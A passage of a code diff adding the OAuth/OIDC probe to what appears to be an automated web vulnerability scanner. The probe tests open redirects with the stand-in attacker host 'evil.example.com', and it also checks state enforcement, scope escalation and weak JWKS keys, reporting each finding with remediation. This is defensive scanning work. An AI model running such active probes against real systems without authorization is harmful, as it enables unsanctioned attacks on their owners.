+                    issues.append("Implicit grant flow is supported (insecure, tokens in URL fragment)")
+
+                # Check if token endpoint uses TLS
+                if token_endpoint and not token_endpoint.startswith("https://"):
+                    issues.append(f"Token endpoint uses non-HTTPS: {token_endpoint}")
+
+                if issues:
+                    f = {
+                        "title": f"OAuth/OIDC Configuration Issues ({disc_path})",
+                        "severity": "Medium",
+                        "confidence": "High",
+                        "owasp_category": "A07:2021",
+                        "cwe": "CWE-346",
+                        "url": f"{base_url}{disc_path}",
+                        "parameter": disc_path,
+                        "payload": f"GET {disc_path}",
+                        "evidence": (
+                            f"OIDC discovery at {disc_path}: " + "; ".join(issues) +
+                            f". Issuer: {config.get('issuer', 'n/a')}."
+                        ),
+                        "remediation": (
+                            "Enforce PKCE with S256 for all authorization code flows. "
+                            "Disable the implicit grant type. Use HTTPS for all "
+                            "OAuth endpoints. Restrict OIDC discovery to necessary fields."
+                        ),
+                        "phase": "Active Baseline (OAuth/OIDC)",
+                        "tool": "active_baseline.oauth_oidc_probe",
+                        "_finding_source": "active_baseline",
+                    }
+                    findings.append(f)
+                    _emit(f)
+
+                # ── Test redirect_uri validation ──
+                if auth_endpoint:
+                    evil_redirect = "https://evil.example.com/callback"
+                    test_url = (
+                        f"{auth_endpoint}?response_type=code"
+                        f"&client_id=probe_test"
+                        f"&redirect_uri={evil_redirect}"
+                        f"&scope=openid"
+                    )
+                    try:
+                        auth_resp = await http_client.get(
+                            test_url, timeout=10.0, follow_redirects=False,
+                            headers=_PROBE_HEADERS,
+                        )
+                        location = str(auth_resp.headers.get("location", ""))
+                        if "evil.example.com" in location:
+                            f = {
+                                "title": "OAuth Open Redirect via redirect_uri",
+                                "severity": "High",
+                                "confidence": "High",
+                                "owasp_category": "A07:2021",
+                                "cwe": "CWE-601",
+                                "url": test_url,
+                                "parameter": "redirect_uri",
+                                "payload": evil_redirect,
+                                "evidence": (
+                                    f"Authorization endpoint redirects to attacker-controlled "
+                                    f"URL: {location}. The redirect_uri parameter is not "
+                                    f"validated against a whitelist."
+                                ),
+                                "remediation": (
+                                    "Validate redirect_uri against a strict whitelist of "
+                                    "pre-registered callback URLs. Reject any redirect_uri "
+                                    "not exactly matching a registered value."
+                                ),
+                                "phase": "Active Baseline (OAuth/OIDC)",
+                                "tool": "active_baseline.oauth_oidc_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(f)
+                            _emit(f)
+                    except Exception:
+                        pass
+
+                # ── State parameter fixation test ──
+                if auth_endpoint:
+                    no_state_url = (
+                        f"{auth_endpoint}?response_type=code"
+                        f"&client_id=probe_test"
+                        f"&redirect_uri=https://example.com/callback"
+                        f"&scope=openid"
+                    )
+                    try:
+                        ns_resp = await http_client.get(
+                            no_state_url, timeout=10.0, follow_redirects=False,
+                            headers=_PROBE_HEADERS,
+                        )
+                        ns_location = str(ns_resp.headers.get("location", ""))
+                        if ns_resp.status_code in (301, 302, 303, 307, 308):
+                            if "state=" not in ns_location and "error" not in ns_location:
+                                sf = {
+                                    "title": "OAuth State Parameter Not Enforced (CSRF Risk)",
+                                    "severity": "Medium",
+                                    "confidence": "High",
+                                    "owasp_category": "A07:2021",
+                                    "cwe": "CWE-352",
+                                    "url": no_state_url,
+                                    "parameter": "state",
+                                    "payload": "Authorization request without state parameter",
+                                    "evidence": (
+                                        f"Authorization endpoint accepted request without "
+                                        f"'state' parameter and redirected to: {ns_location[:200]}. "
+                                        f"Missing state enables OAuth CSRF attacks."
+                                    ),
+                                    "remediation": (
+                                        "Require the 'state' parameter in all authorization "
+                                        "requests. Validate the state value on callback to "
+                                        "prevent CSRF."
+                                    ),
+                                    "phase": "Active Baseline (OAuth/OIDC)",
+                                    "tool": "active_baseline.oauth_oidc_probe",
+                                    "_finding_source": "active_baseline",
+                                }
+                                findings.append(sf)
+                                _emit(sf)
+                    except Exception:
+                        pass
+
+                # ── Scope escalation test ──
+                scopes_supported = config.get("scopes_supported", [])
+                if scopes_supported and auth_endpoint:
+                    all_scopes = " ".join(scopes_supported)
+                    scope_url = (
+                        f"{auth_endpoint}?response_type=code"
+                        f"&client_id=probe_test"
+                        f"&redirect_uri=https://example.com/callback"
+                        f"&scope={all_scopes}"
+                        f"&state=probe_state"
+                    )
+                    try:
+                        sc_resp = await http_client.get(
+                            scope_url, timeout=10.0, follow_redirects=False,
+                            headers=_PROBE_HEADERS,
+                        )
+                        sc_location = str(sc_resp.headers.get("location", ""))
+                        if sc_resp.status_code in (301, 302, 303, 307, 308) and "error" not in sc_location:
+                            sef = {
+                                "title": "OAuth Scope Escalation Possible",
+                                "severity": "Medium",
+                                "confidence": "Medium",
+                                "owasp_category": "A01:2021",
+                                "cwe": "CWE-269",
+                                "url": scope_url,
+                                "parameter": "scope",
+                                "payload": all_scopes,
+                                "evidence": (
+                                    f"Authorization endpoint accepted all "
+                                    f"{len(scopes_supported)} scopes without "
+                                    f"rejection: {all_scopes[:200]}. "
+                                    f"Redirect: {sc_location[:200]}"
+                                ),
+                                "remediation": (
+                                    "Validate requested scopes against per-client "
+                                    "allowlists. Reject scope combinations that "
+                                    "exceed the client's authorized access level."
+                                ),
+                                "phase": "Active Baseline (OAuth/OIDC)",
+                                "tool": "active_baseline.oauth_oidc_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(sef)
+                            _emit(sef)
+                    except Exception:
+                        pass
+
+                # ── JWKS endpoint exposure check ──
+                jwks_uri = config.get("jwks_uri", "")
+                if jwks_uri:
+                    try:
+                        import json as _json_jwk
+                        jwk_resp = await http_client.get(
+                            jwks_uri, timeout=10.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        if jwk_resp.status_code == 200:
+                            jwk_data = _json_jwk.loads(jwk_resp.text[:20_000])
+                            keys = jwk_data.get("keys", [])
+                            weak_keys = [
+                                k for k in keys
+                                if k.get("kty") == "RSA" and
+                                len(k.get("n", "")) < 340
+                            ]
+                            if weak_keys:
+                                jf = {
+                                    "title": "Weak RSA Key in JWKS",
+                                    "severity": "High",
+                                    "confidence": "High",
+                                    "owasp_category": "A02:2021",
+                                    "cwe": "CWE-326",
+                                    "url": jwks_uri,
+                                    "parameter": "jwks_uri",
+                                    "payload": f"GET {jwks_uri}",
+                                    "evidence": (
+                                        f"JWKS at {jwks_uri} contains "
+                                        f"{len(weak_keys)} RSA key(s) with "
+                                        f"modulus < 2048 bits."
+                                    ),
+                                    "remediation": (
+                                        "Use RSA keys with at least 2048-bit "
+                                        "modulus. Rotate any weak keys."
+                                    ),
+                                    "phase": "Active Baseline (OAuth/OIDC)",
+                                    "tool": "active_baseline.oauth_oidc_probe",
+                                    "_finding_source": "active_baseline",
+                                }
+                                findings.append(jf)
+                                _emit(jf)
+                    except Exception:
+                        pass
+
+                break  # found a valid discovery endpoint
+            except Exception:
+                continue
+
+    _progress("active_baseline_end", {
+        "probe": "oauth_oidc", "findings": len(findings),
+    })
+    return findings
+
+
+__all__ = [
+    "run_bare_root_sqli_probe",
+    "run_cache_poisoning_probe",
+    "run_reflected_xss_probe",
+    "run_ssrf_probe",
+    "run_open_redirect_probe",
+    "run_sensitive_path_probe",
+    "run_salesforce_probe",
+    "run_graphql_introspection_probe",
+    "run_http_smuggling_probe",
+    "run_oauth_oidc_probe",
+    "_discover_params_from_html",
+    "_discover_ssrf_params",
+    "_classify_canary_context",
+    "_is_salesforce_host",
+]
